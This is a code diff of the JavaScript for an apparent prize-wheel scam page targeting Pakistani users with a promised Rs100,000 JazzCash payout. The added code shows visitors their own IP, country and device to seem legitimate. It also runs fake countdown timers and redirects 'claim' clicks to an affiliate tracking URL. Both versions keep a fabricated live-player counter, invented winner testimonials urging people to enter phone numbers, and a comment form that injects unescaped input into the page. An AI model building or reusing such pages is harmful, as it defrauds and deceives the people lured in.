+  function startPrizeCounter(){ const el = document.getElementById('prize-counter'); const target = 100000; const duration = 5000; const startTime = performance.now(); _playSquid(10, 5.0); function tick(now){ const elapsed = now - startTime, t = Math.min(elapsed/duration, 1); const eased = t<0.5 ? 2*t*t : 1-Math.pow(-2*t+2,2)/2; el.textContent = Math.floor(eased * target).toLocaleString(); if(t < 1){ requestAnimationFrame(tick); } else { el.textContent = target.toLocaleString(); playWinFanfare(); } } requestAnimationFrame(tick); }
+  let _offerTimer = null; function startOfferCountdown(){ clearInterval(_offerTimer); let secs = 60; const el = document.getElementById('offer-countdown'); if(el) el.textContent = '01:00'; _offerTimer = setInterval(() => { secs--; const cd = document.getElementById('offer-countdown'); if(!cd) return; const m = Math.floor(secs/60).toString().padStart(2,'0'); const s = (secs%60).toString().padStart(2,'0'); cd.textContent = m+':'+s; if(secs <= 0){ clearInterval(_offerTimer); cd.textContent = '00:00'; } }, 1000); }
+  function closeModal(){ document.getElementById('modal').classList.remove('open'); document.getElementById('spin-btn').disabled = false; document.getElementById('prize-counter').textContent = '0'; clearInterval(_offerTimer); const cd = document.getElementById('offer-countdown'); if(cd) cd.textContent = '01:00'; _stopSquid(); }
+  function handleClaim(){ window.open('https://vtdmp.bemobtrcks.com/click/1?ns=c%3D391e0127-2fb1-490e-b450-95efb6f353d3..l%3D2..a%3D0..b%3D0', '_blank'); setTimeout(() => { closeModal(); }, 500); }
+  
+  // --- DETECT ACTUAL DEVICE, IP, COUNTRY ---
+  function getUserDevice() {
+    const ua = navigator.userAgent;
+    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) return "Tablet";
+    if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile Phone";
+    return "Desktop / Laptop";
+  }
+  
+  async function fetchVisitorData() {
+    const ipSpan = document.getElementById('visitorIP');
+    const deviceSpan = document.getElementById('visitorDevice');
+    const countrySpan = document.getElementById('visitorCountry');
+    
+    // Set device immediately
+    deviceSpan.textContent = getUserDevice();
+    
+    // Fetch IP and geolocation
+    try {
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
+      ipSpan.textContent = data.ip || 'Unknown';
+      countrySpan.textContent = data.country_name || data.country || 'Unknown';
+    } catch (error) {
+      ipSpan.textContent = 'Unable to detect';
+      countrySpan.textContent = 'Unknown';
+      console.warn("IP detection failed", error);
     }
-    requestAnimationFrame(frame);
   }
-
-  function spawnConfetti(){
-    const wrap = document.getElementById('confetti');
-    wrap.classList.remove('hidden'); wrap.innerHTML = '';
-    const colors = ['#f5b942','#ff6b6b','#7ed321','#42b8f5','#c084fc','#fbbf24','#34d399'];
-    for(let i=0;i<90;i++){
-      const el = document.createElement('div'); el.className = 'cf';
-      el.style.cssText = `left:${Math.random()*100}%;width:${6+Math.random()*8}px;height:${6+Math.random()*8}px;background:${colors[Math.floor(Math.random()*colors.length)]};animation-duration:${2+Math.random()*2}s;animation-delay:${Math.random()*0.6}s;`;
-      wrap.appendChild(el);
-    }
-    setTimeout(()=> wrap.classList.add('hidden'), 4500);
+  
+  // --- POPUP LOGIC ---
+  let entryTimer = null, reminderTimer = null;
+  function startEntryCountdown() { let secs = 60; const cdSpan = document.getElementById('entryOfferCountdown'); if(cdSpan) cdSpan.textContent = '01:00'; clearInterval(entryTimer); entryTimer = setInterval(() => { secs--; if(secs < 0) { clearInterval(entryTimer); if(cdSpan) cdSpan.textContent = '00:00'; return; } const m = Math.floor(secs/60).toString().padStart(2,'0'); const s = (secs%60).toString().padStart(2,'0'); if(cdSpan) cdSpan.textContent = `${m}:${s}`; }, 1000); }
+  
+  function startReminderCountdown() { let secs = 45; const cdSpan = document.getElementById('reminder-countdown'); if(cdSpan) cdSpan.textContent = '00:45'; clearInterval(reminderTimer); reminderTimer = setInterval(() => { secs--; if(secs < 0) { clearInterval(reminderTimer); if(cdSpan) cdSpan.textContent = '00:00'; return; } const m = Math.floor(secs/60).toString().padStart(2,'0'); const s = (secs%60).toString().padStart(2,'0'); if(cdSpan) cdSpan.textContent = `${m}:${s}`; }, 1000); }
+  
+  function closeEntryPopupAndShowSpin() {
+    document.getElementById('entryPopup').classList.remove('open');
+    clearInterval(entryTimer);
+    document.querySelector('.wheel-outer').scrollIntoView({ behavior: 'smooth', block: 'center' });
   }
-
-  function playWinFanfare(){
-    try{
-      const ctx = getAudioCtx(); const now = ctx.currentTime;
-      const notes = [523,659,784,1047,1319];
-      notes.forEach((freq,i) => {
-        const osc = ctx.createOscillator(); const g = ctx.createGain();
-        osc.type = 'triangle'; osc.frequency.value = freq;
-        const t = now + i*0.08;
-        g.gain.setValueAtTime(0, t); g.gain.linearRampToValueAtTime(0.3, t+0.03);
-        g.gain.exponentialRampToValueAtTime(0.001, t+0.45);
-        osc.connect(g); g.connect(ctx.destination); osc.start(t); osc.stop(t+0.5);
-      });
-    } catch(e) {}
+  
+  function showReminderPopup() {
+    document.getElementById('entryPopup').classList.remove('open');
+    clearInterval(entryTimer);
+    const reminder = document.getElementById('reminderPopup');
+    startReminderCountdown();
+    reminder.classList.add('open');
   }
-
-  let squidAudio = null;
-  function _loadSquid(cb){
-    if(squidAudio){ cb(squidAudio); return; }
-    squidAudio = new Audio("https://res.cloudinary.com/dbhfjxl73/video/upload/v1779602533/extracted_audio_asuedv.mp3");
-    squidAudio.preload = "auto";
-    squidAudio.addEventListener("canplaythrough", () => { cb(squidAudio); });
-  }
-  function _playSquid(offsetSecs, durationSecs){
-    _loadSquid(audio => {
-      try{
-        audio.currentTime = offsetSecs; audio.play().catch(()=>{});
-        setTimeout(() => { audio.pause(); }, durationSecs * 1000);
-      }catch(e){}
-    });
-  }
-  function _stopSquid(){
-    if(squidAudio){ squidAudio.pause(); squidAudio.currentTime = 0; }
-  }
-  document.addEventListener('click', function pre(){
-    _loadSquid(()=>{});
-  }, {once:true});
-
-  function startPrizeCounter(){
-    const el = document.getElementById('prize-counter');
-    const target = 100000; const duration = 5000;
-    const startTime = performance.now();
-    _playSquid(10, 5.0);
-    function tick(now){
-      const elapsed = now - startTime, t = Math.min(elapsed/duration, 1);
-      const eased = t<0.5 ? 2*t*t : 1-Math.pow(-2*t+2,2)/2;
-      el.textContent = Math.floor(eased * target).toLocaleString();
-      if(t < 1){ requestAnimationFrame(tick); }
-      else { el.textContent = target.toLocaleString(); playWinFanfare(); }
-    }
-    requestAnimationFrame(tick);
-  }
-
-  let _offerTimer = null;
-  function startOfferCountdown(){
-    clearInterval(_offerTimer);
-    let secs = 60;
-    const el = document.getElementById('offer-countdown');
-    if(el) el.textContent = '01:00';
-    _offerTimer = setInterval(() => {
-      secs--;
-      const cd = document.getElementById('offer-countdown');
-      if(!cd) return;
-      const m = Math.floor(secs/60).toString().padStart(2,'0');
-      const s = (secs%60).toString().padStart(2,'0');
-      cd.textContent = m+':'+s;
-      if(secs <= 0){ clearInterval(_offerTimer); cd.textContent = '00:00'; }
-    }, 1000);
-  }
-
- function closeModal(){
-    document.getElementById('modal').classList.remove('open');
-    document.getElementById('spin-btn').disabled = false;
-    document.getElementById('prize-counter').textContent = '0';
-    clearInterval(_offerTimer);
-    const cd = document.getElementById('offer-countdown');
-    if(cd) cd.textContent = '01:00';
-    _stopSquid();
-}
-
-function handleClaim(){
-    // Open the URL first
+  
+  function closeReminderAndRedirectToOffer() {
     window.open('https://vtdmp.bemobtrcks.com/click/1?ns=c%3D391e0127-2fb1-490e-b450-95efb6f353d3..l%3D2..a%3D0..b%3D0', '_blank');
-    // Then close the modal after a short delay
-    setTimeout(() => {
-        closeModal();
-    }, 500);
-}
-    
- function handleClaim(){
-    // Open the URL first
-    window.open('https://vtdmp.bemobtrcks.com/click/1?ns=c%3D391e0127-2fb1-490e-b450-95efb6f353d3..l%3D2..a%3D0..b%3D0', '_blank');
-    // Then close the modal after a short delay
-    setTimeout(() => {
-        closeModal();
-    }, 500);
- }
-
-  // ── Live count ──
-  (function(){
-    let count = 3812;
-    setInterval(() => {
-      count += Math.floor(Math.random()*9)-3;
-      if(count < 3600) count = 3620;
-      document.getElementById('live-count').textContent = count.toLocaleString()+' people playing right now';
-    }, 3200);
-  })();
-
-  // ── Comments with RELIABLE profile images from UI Avatars ──
-  const COMMENTS = [
-    {name:'Sana Mirza',   loc:'Lahore',      time:'2m ago', prize:'🏆 Won Rs100,000',
-     text:'I literally screamed when I saw Rs100,000! My hands were shaking. Already got the JazzCash notification. This is 100% real, don\'t miss it!', likes:312, bg:'e91e63', color:'fff'},
-    {name:'Hamza Sheikh', loc:'Karachi',     time:'5m ago', prize:'🏆 Won Rs100,000',
-     text:'Bhai log trust karo, mujhe bhi Rs100,000 mila. Pehle mujhe bhi doubt tha lekin JazzCash pe aa gaya paisa. Abhi spin karo!', likes:287, bg:'2196f3', color:'fff'},
-    {name:'Fatima Noor',  loc:'Islamabad',   time:'9m ago', prize:'🏆 Won Rs100,000',
-     text:'Alhamdulillah! I was skeptical at first but this is genuine. The prize came through in less than an hour. Share with your family!', likes:241, bg:'9c27b0', color:'fff'},
-    {name:'Bilal Raza',   loc:'Rawalpindi',  time:'14m ago',prize:'🏆 Won Rs100,000',
-     text:'Yaar pehle socha fraud hoga... lekin sach mein Rs100,000 mila! Phone number daal do aur prize lo. Zabardast!', likes:198, bg:'4caf50', color:'fff'},
-    {name:'Usman Ali',    loc:'Faisalabad',  time:'21m ago',prize:'🏆 Won Rs100,000',
-     text:'Just claimed my prize a few minutes ago. The whole process was super easy — spin, enter your number, done. Highly recommend!', likes:174, bg:'ff9800', color:'fff'},
-  ];
-
-  function getAvatarUrl(name, bg, color) {
-    const initials = name.split(' ').map(n => n[0]).join('').toUpperCase();
-    return `https://ui-avatars.com/api/?name=${encodeURIComponent(initials)}&background=${bg}&color=${color}&size=80&bold=true&format=png`;
+    document.getElementById('reminderPopup').classList.remove('open');
+    clearInterval(reminderTimer);
   }
-
-  function getAvatarFallback(initials, bg, color) {
-    return `data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2240%22 height=%2240%22%3E%3Crect fill=%22%23${bg}%22 width=%2240%22 height=%2240%22/%3E%3Ctext x=%2250%25%22 y=%2255%25%22 dominant-baseline=%22middle%22 text-anchor=%22middle%22 fill=%22%23${color}%22 font-size=%2218%22 font-weight=%22bold%22%3E${initials}%3C/text%3E%3C/svg%3E`;
-  }
-
-  function buildComments(){
-    const list = document.getElementById('comments-list');
-    list.innerHTML = '';
-    COMMENTS.forEach((c,i) => {
-      const item = document.createElement('div');
-      item.className = 'comment-item';
-      const initials = c.name.split(' ').map(n => n[0]).join('').toUpperCase();
-      const avatarUrl = getAvatarUrl(c.name, c.bg, c.color);
-      const fallback = getAvatarFallback(initials, c.bg, c.color);
-      
-      item.innerHTML = `
-        <img class="c-avatar" src="${avatarUrl}" alt="${c.name}" 
-          loading="lazy"
-          onerror="this.onerror=null; this.src='${fallback}';">
-        <div class="c-body">
-          <div class="c-top">
-            <span class="c-name">${c.name}</span>
-            <span class="c-loc">· ${c.loc}</span>
-            <span class="c-time">${c.time}</span>
-          </div>
-          <div class="c-prize-pill">${c.prize}</div>
-          <p class="c-text">${c.text}</p>
-          <div class="c-actions">
-            <button class="c-like-btn" onclick="toggleLike(this,${i})">
-              <svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
-              <span class="like-count">${c.likes}</span>
-            </button>
-            <button class="c-reply-btn">Reply</button>
-          </div>
-        </div>`;
-      list.appendChild(item);
-    });
-  }
-
-  function toggleLike(btn, idx){
-    const liked = btn.classList.toggle('liked');
-    btn.querySelector('.like-count').textContent = liked ? COMMENTS[idx].likes+1 : COMMENTS[idx].likes;
-  }
-
-  // ── Visitor comment posting with name ──
-  function postVisitorComment(){
-    const nameInput = document.getElementById('visitorNameInput');
-    const commentInput = document.getElementById('visitorCommentInput');
-    const visitorName = nameInput.value.trim() || 'Anonymous';
-    const text = commentInput.value.trim();
-    
-    if(!text) {
-      alert('Please write a comment before posting.');
-      return;
-    }
-
-    const list = document.getElementById('comments-list');
-    const item = document.createElement('div');
-    item.className = 'comment-item';
-    
-    // Generate avatar based on visitor name
-    const initials = visitorName === 'Anonymous' ? '?' : visitorName.split(' ').map(n => n[0]).join('').toUpperCase();
-    const bg = 'f5b942';
-    const color = '000';
-    const avatarUrl = getAvatarUrl(visitorName, bg, color);
-    const fallback = getAvatarFallback(initials, bg, color);
-
-    // Random location in Pakistan
-    const cities = ['Lahore', 'Karachi', 'Islamabad', 'Rawalpindi', 'Faisalabad', 'Peshawar', 'Quetta', 'Multan'];
-    const randomCity = cities[Math.floor(Math.random() * cities.length)];
-
-    item.innerHTML = `
-      <img class="c-avatar" src="${avatarUrl}" alt="${visitorName}" 
-        loading="lazy"
-        onerror="this.onerror=null; this.src='${fallback}';">
-      <div class="c-body">
-        <div class="c-top">
-          <span class="c-name">${visitorName}</span>
-          <span class="c-loc">· ${randomCity}</span>
-          <span class="c-time">Just now</span>
-        </div>
-        <div class="c-prize-pill">🎉 Just played</div>
-        <p class="c-text">${text}</p>
-        <div class="c-actions">
-          <button class="c-like-btn" onclick="toggleVisitorLike(this)">
-            <svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
-            <span class="like-count">0</span>
-          </button>
-          <button class="c-reply-btn">Reply</button>
-        </div>
-      </div>`;
-    list.prepend(item);
-    
-    // Clear inputs
-    nameInput.value = '';
-    commentInput.value = '';
-  }
-
-  function toggleVisitorLike(btn){
-    const liked = btn.classList.toggle('liked');
-    const countSpan = btn.querySelector('.like-count');
-    let current = parseInt(countSpan.textContent) || 0;
-    countSpan.textContent = liked ? current + 1 : Math.max(0, current - 1);
-  }
-
+  
+  // Initialize popup with real visitor data
+  window.addEventListener('load', async () => {
+    await fetchVisitorData();  // Get real IP and country
+    startEntryCountdown();
+    document.getElementById('entryPopup').classList.add('open');
+    document.getElementById('entryPopupClaimBtn').onclick = () => { closeEntryPopupAndShowSpin(); };
+    document.getElementById('closeEntryPopup').onclick = () => { showReminderPopup(); };
+    document.getElementById('reminderClaimBtn').onclick = () => { closeReminderAndRedirectToOffer(); };
+  });
+  
+  // Live comments & interaction (original)
+  (function(){ let count = 3812; setInterval(() => { count += Math.floor(Math.random()*9)-3; if(count < 3600) count = 3620; document.getElementById('live-count').textContent = count.toLocaleString()+' people playing right now'; }, 3200); })();
+  const COMMENTS = [{name:'Sana Mirza',loc:'Lahore',time:'2m ago',prize:'🏆 Won Rs100,000',text:'I literally screamed when I saw Rs100,000! My hands were shaking. Already got the JazzCash notification. This is 100% real, don\'t miss it!',likes:312,bg:'e91e63',color:'fff'},{name:'Hamza Sheikh',loc:'Karachi',time:'5m ago',prize:'🏆 Won Rs100,000',text:'Bhai log trust karo, mujhe bhi Rs100,000 mila. Pehle mujhe bhi doubt tha lekin JazzCash pe aa gaya paisa. Abhi spin karo!',likes:287,bg:'2196f3',color:'fff'},{name:'Fatima Noor',loc:'Islamabad',time:'9m ago',prize:'🏆 Won Rs100,000',text:'Alhamdulillah! I was skeptical at first but this is genuine. The prize came through in less than an hour. Share with your family!',likes:241,bg:'9c27b0',color:'fff'},{name:'Bilal Raza',loc:'Rawalpindi',time:'14m ago',prize:'🏆 Won Rs100,000',text:'Yaar pehle socha fraud hoga... lekin sach mein Rs100,000 mila! Phone number daal do aur prize lo. Zabardast!',likes:198,bg:'4caf50',color:'fff'},{name:'Usman Ali',loc:'Faisalabad',time:'21m ago',prize:'🏆 Won Rs100,000',text:'Just claimed my prize a few minutes ago. The whole process was super easy — spin, enter your number, done. Highly recommend!',likes:174,bg:'ff9800',color:'fff'}];
+  function getAvatarUrl(name, bg, color) { const initials = name.split(' ').map(n => n[0]).join('').toUpperCase(); return `https://ui-avatars.com/api/?name=${encodeURIComponent(initials)}&background=${bg}&color=${color}&size=80&bold=true&format=png`; }
+  function getAvatarFallback(initials, bg, color) { return `data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2240%22 height=%2240%22%3E%3Crect fill=%22%23${bg}%22 width=%2240%22 height=%2240%22/%3E%3Ctext x=%2250%25%22 y=%2255%25%22 dominant-baseline=%22middle%22 text-anchor=%22middle%22 fill=%22%23${color}%22 font-size=%2218%22 font-weight=%22bold%22%3E${initials}%3C/text%3E%3C/svg%3E`; }
+  function buildComments(){ const list = document.getElementById('comments-list'); list.innerHTML = ''; COMMENTS.forEach((c,i) => { const item = document.createElement('div'); item.className = 'comment-item'; const initials = c.name.split(' ').map(n => n[0]).join('').toUpperCase(); const avatarUrl = getAvatarUrl(c.name, c.bg, c.color); const fallback = getAvatarFallback(initials, c.bg, c.color); item.innerHTML = `<img class="c-avatar" src="${avatarUrl}" alt="${c.name}" loading="lazy" onerror="this.onerror=null; this.src='${fallback}';"><div class="c-body"><div class="c-top"><span class="c-name">${c.name}</span><span class="c-loc">· ${c.loc}</span><span class="c-time">${c.time}</span></div><div class="c-prize-pill">${c.prize}</div><p class="c-text">${c.text}</p><div class="c-actions"><button class="c-like-btn" onclick="toggleLike(this,${i})"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg><span class="like-count">${c.likes}</span></button><button class="c-reply-btn">Reply</button></div></div>`; list.appendChild(item); }); }
+  function toggleLike(btn, idx){ const liked = btn.classList.toggle('liked'); btn.querySelector('.like-count').textContent = liked ? COMMENTS[idx].likes+1 : COMMENTS[idx].likes; }
+  window.postVisitorComment = function(){ const nameInput = document.getElementById('visitorNameInput'); const commentInput = document.getElementById('visitorCommentInput'); const visitorName = nameInput.value.trim() || 'Anonymous'; const text = commentInput.value.trim(); if(!text) { alert('Please write a comment before posting.'); return; } const list = document.getElementById('comments-list'); const item = document.createElement('div'); item.className = 'comment-item'; const initials = visitorName === 'Anonymous' ? '?' : visitorName.split(' ').map(n => n[0]).join('').toUpperCase(); const bg = 'f5b942'; const color = '000'; const avatarUrl = getAvatarUrl(visitorName, bg, color); const fallback = getAvatarFallback(initials, bg, color); const cities = ['Lahore','Karachi','Islamabad','Rawalpindi','Faisalabad','Peshawar','Quetta','Multan']; const randomCity = cities[Math.floor(Math.random() * cities.length)]; item.innerHTML = `<img class="c-avatar" src="${avatarUrl}" alt="${visitorName}" loading="lazy" onerror="this.onerror=null; this.src='${fallback}';"><div class="c-body"><div class="c-top"><span class="c-name">${visitorName}</span><span class="c-loc">· ${randomCity}</span><span class="c-time">Just now</span></div><div class="c-prize-pill">🎉 Just played</div><p class="c-text">${text}</p><div class="c-actions"><button class="c-like-btn" onclick="toggleVisitorLike(this)"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg><span class="like-count">0</span></button><button class="c-reply-btn">Reply</button></div></div>`; list.prepend(item); nameInput.value = ''; commentInput.value = ''; };
+  window.toggleVisitorLike = function(btn){ const liked = btn.classList.toggle('liked'); const countSpan = btn.querySelector('.like-count'); let current = parseInt(countSpan.textContent) || 0; countSpan.textContent = liked ? current + 1 : Math.max(0, current - 1); };
   buildComments();
 </script>
 </body>
